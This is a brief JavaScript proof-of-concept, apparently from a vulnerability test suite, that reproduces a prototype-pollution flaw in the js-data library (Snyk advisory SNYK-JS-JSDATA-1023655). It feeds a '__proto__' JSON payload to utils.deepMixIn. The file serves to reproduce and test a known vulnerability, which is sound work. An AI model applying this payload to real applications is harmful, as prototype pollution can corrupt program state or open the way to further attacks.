//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655

// Downgrade to v.3.0.8 because v.3.0.9 has incorrect source code mapping and 
// `jest` generates a wrong .PoC.expected file
// v.3.0.9 is still vulnerable, v.3.0.10 is fixed

const { utils } = require("js-data");
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
utils.deepMixIn({}, source);
